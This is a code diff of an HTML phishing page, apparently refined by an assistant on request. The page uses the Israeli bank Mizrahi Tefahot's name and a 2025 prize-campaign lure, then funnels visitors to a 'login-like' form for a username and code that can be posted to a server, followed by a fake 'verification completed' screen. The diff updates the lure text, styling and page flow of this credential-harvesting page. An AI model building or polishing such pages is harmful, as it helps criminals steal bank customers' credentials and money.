@@ -34,8 +34,8 @@
     /* HERO */
     .hero {
       width:100%;
-      min-height:48vh;
-      height:56vh;
+      min-height:40vh;
+      height:44vh;
       background-image: url('https://www2.0zz0.com/2025/10/20/18/772546082.jpeg');
       background-size:cover;
       background-position:center top;
@@ -45,14 +45,19 @@
       position:relative;
       border-bottom-left-radius:0;
       border-bottom-right-radius:0;
+      transition:opacity .28s ease, transform .28s ease;
     }
+    /* Remove the semi-transparent overlay so image is shown normally (non-transparent) */
     .hero::before{
       content:"";
       position:absolute;inset:0;
-      background: linear-gradient(rgba(255,255,255,0.04), rgba(255,255,255,0.9) 72%, rgba(255,255,255,0.98));
-      z-index:1;
+      background: none; /* removed gradient to make image opaque */
+      z-index:0;
     }
     .hero-inner{position:relative;z-index:2;width:100%;max-width:var(--maxw);padding:18px;text-align:center}
+
+    /* allow hiding hero when not on landing */
+    .hero.hidden { display:none; opacity:0; transform:translateY(-8px); }
 
     /* Card that overlaps hero like in examples */
     .card {
@@ -65,30 +70,34 @@
       box-shadow:0 10px 30px rgba(10,20,40,0.04);
       position:relative;
       text-align:center;
+      transition:transform .22s ease, box-shadow .22s ease;
     }
+    .card:focus-within, .card:hover { transform:translateY(-2px); box-shadow:0 14px 34px rgba(10,20,40,0.06); }
 
     /* Landing texts & buttons */
-    .brand { font-size:22px;font-weight:700;margin:4px 0 6px;color:var(--accent) }
-    .lead { font-size:24px; line-height:1.5; font-weight:700; margin:6px auto 12px; color:var(--accent) }
-    .sub { font-size:16px; line-height:1.7; color:var(--accent); margin-bottom:16px }
-    .choose { font-size:18px; font-weight:700; margin:12px 0 8px }
+    .brand { font-size:20px;font-weight:700;margin:4px 0 6px;color:var(--accent) }
+    .lead { font-size:20px; line-height:1.4; font-weight:700; margin:6px auto 10px; color:var(--accent) }
+    .sub { font-size:15px; line-height:1.6; color:var(--accent); margin-bottom:14px }
+    .choose { font-size:17px; font-weight:700; margin:10px 0 8px }
 
     .btn {
       display:block;
       width:calc(100% - 32px);
       max-width:420px;
-      margin:12px auto;
+      margin:10px auto;
       background:var(--orange);
       color:#fff;
       border:none;
-      padding:16px 18px;
+      padding:14px 18px;
       border-radius:50px;
-      font-size:18px;
+      font-size:17px;
       font-weight:700;
-      box-shadow: 0 10px 28px rgba(19,38,79,0.12);
+      box-shadow: 0 8px 22px rgba(19,38,79,0.10);
       cursor:pointer;
       text-decoration:none;
+      transition:transform .16s ease, box-shadow .16s ease, background-color .12s ease;
     }
+    .btn:active { transform:translateY(1px) scale(.998); }
     .btn.secondary {
       background:var(--accent);
     }
@@ -96,7 +105,7 @@
     /* Login-like page (matches image #4) */
     .logo-box { text-align:center;margin-top:6px;margin-bottom:6px }
     .logo-img { width:86px; height:auto; display:block; margin:8px auto }
-    .title { font-size:20px; font-weight:700; color:var(--accent); margin:6px 0 14px; text-align:center }
+    .title { font-size:18px; font-weight:700; color:var(--accent); margin:6px 0 12px; text-align:center }
 
     .inputs { background:transparent; padding:6px 0; text-align:left }
     .field {
@@ -106,7 +115,7 @@
       font-size:16px;
       color:var(--accent);
     }
-    .field .label { font-size:15px;color:var(--muted); display:block; margin-bottom:6px; text-align:left }
+    .field .label { font-size:14px;color:var(--muted); display:block; margin-bottom:6px; text-align:left }
     .field input{
       width:100%;
       border:0;
@@ -120,15 +129,16 @@
 
     .forgot { color:var(--muted); font-size:14px; margin:12px 0; text-align:left }
 
-    .spacer{height:120px}
+    .spacer{height:96px}
 
     /* pages visibility */
     .page { display:none }
     .page.active { display:block }
 
     @media (max-width:420px){
-      .hero{min-height:44vh;height:52vh;background-position:center 10%}
-      .spacer{height:220px}
+      .hero{min-height:36vh;height:40vh;background-position:center 10%}
+      .spacer{height:180px}
+      .lead{font-size:18px}
     }
   </style>
 </head>
@@ -143,10 +153,11 @@
     <!-- MAIN CARD -->
     <div class="card">
 
-      <!-- Landing page (buttons lead directly to the second page as requested) -->
+      <!-- LANDING (first) PAGE -->
       <div id="landing" class="page active" aria-live="polite">
         <div class="brand">עם בנק מזרחי טפחות</div>
-        <p class="lead">עם הקמפיין לשנת 2024, הפרסים שלנו שונים על פי</p>
+        <!-- year changed from 2024 to 2025 as requested -->
+        <p class="lead">עם הקמפיין לשנת 2025, הפרסים שלנו שונים על פי</p>
         <p class="sub">ערכם ומספרם, וכוללים פרסים גדולים ויומיים, שבועיים, חודשיים ומשולשים לכל לקוחותינו.</p>
         <p class="choose">בחר את השירות המתאים לך</p>
 
@@ -156,11 +167,10 @@
         <div class="spacer" aria-hidden="true"></div>
       </div>
 
-      <!-- Login-like second page (matches image 4 exactly: username + code, big bluish button) -->
+      <!-- Login-like second page (username + code) -->
       <div id="loginPage" class="page" aria-live="polite">
         <div class="logo-box">
-          <!-- The image used here is decorative. Replace only if you have permission. -->
-          <!-- Using a simple inline SVG placeholder that mimics a centered logo shape -->
+          <!-- Decorative inline SVG -->
           <svg width="86" height="52" viewBox="0 0 86 52" fill="none" xmlns="http://www.w3.org/2000/svg" class="logo-img" aria-hidden="true">
             <rect width="86" height="52" rx="6" fill="#f7f7f8"/>
           </svg>
@@ -189,7 +199,7 @@
         <div class="spacer" aria-hidden="true"></div>
       </div>
 
-      <!-- Success page (simple) -->
+      <!-- Success page -->
       <div id="successPage" class="page" aria-live="polite">
         <h2 class="title">אימות הושלם</h2>
         <p style="color:#2f8a4d;margin-top:6px">תודה — ההרשמה הושלמה בהצלחה.</p>
@@ -218,24 +228,41 @@
     const loginBtn = document.getElementById('loginBtn');
     const backBtn = document.getElementById('backBtn');
     const loginMsg = document.getElementById('loginMsg');
+    const heroEl = document.querySelector('.hero');
 
+    // simple helpers
     function show(el){ el.classList.add('active'); }
     function hide(el){ el.classList.remove('active'); }
 
-    // Initial state: landing visible (already set in HTML)
-    // Both landing buttons go directly to the second page (as you requested to remove the registration fields)
-    shareBtn.addEventListener('click', () => {
-      hide(landing);
-      show(loginPage);
-      window.scrollTo({top:0,behavior:'smooth'});
-    });
-    enterBtn.addEventListener('click', () => {
-      hide(landing);
-      show(loginPage);
-      window.scrollTo({top:0,behavior:'smooth'});
-    });
+    // Unified page switcher: shows requested page and hides the others.
+    function setActivePage(pageId) {
+      const pages = { landing, loginPage, successPage };
+      Object.keys(pages).forEach(key => {
+        const el = pages[key];
+        if (el) {
+          if (el.id === pageId) show(el); else hide(el);
+        }
+      });
 
-    // Login button: either simulate or POST to server
+      // show hero only on landing
+      if (pageId === 'landing') {
+        heroEl.classList.remove('hidden');
+      } else {
+        heroEl.classList.add('hidden');
+      }
+
+      // scroll top for small screens
+      window.scrollTo({top:0,behavior:'smooth'});
+    }
+
+    // initial: landing visible & hero visible (landing has active in HTML)
+    heroEl.classList.remove('hidden');
+
+    // Both landing buttons go directly to the second page
+    shareBtn.addEventListener('click', () => setActivePage('loginPage'));
+    enterBtn.addEventListener('click', () => setActivePage('loginPage'));
+
+    // Login submit: either simulate or POST to server
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       loginMsg.textContent = '';
@@ -265,8 +292,7 @@
             loginMsg.style.color = 'red';
             loginMsg.textContent = data.error || 'שגיאה בשרת';
           } else {
-            hide(loginPage);
-            show(successPage);
+            setActivePage('successPage');
           }
         } catch (err) {
           console.error(err);
@@ -279,8 +305,7 @@
       } else {
         // SIMULATION: accept any 6-digit numeric code (demo-only).
         if (/^\d{6}$/.test(code)) {
-          hide(loginPage);
-          show(successPage);
+          setActivePage('successPage');
         } else {
           loginMsg.style.color = 'red';
           loginMsg.textContent = 'קוד לא תקין (לסימולציה הזן 6 ספרות, לדוגמה 123456).';
@@ -291,16 +316,12 @@
     });
 
     // Back button from success to landing
-    backBtn.addEventListener('click', () => {
-      hide(successPage);
-      show(landing);
-      window.scrollTo({top:0,behavior:'smooth'});
-    });
+    backBtn.addEventListener('click', () => setActivePage('landing'));
 
     // Keyboard: Esc returns to landing
     document.addEventListener('keydown', (e) => {
       if (e.key === 'Escape') {
-        hide(loginPage); hide(successPage); show(landing);
+        setActivePage('landing');
       }
     });
   </script>
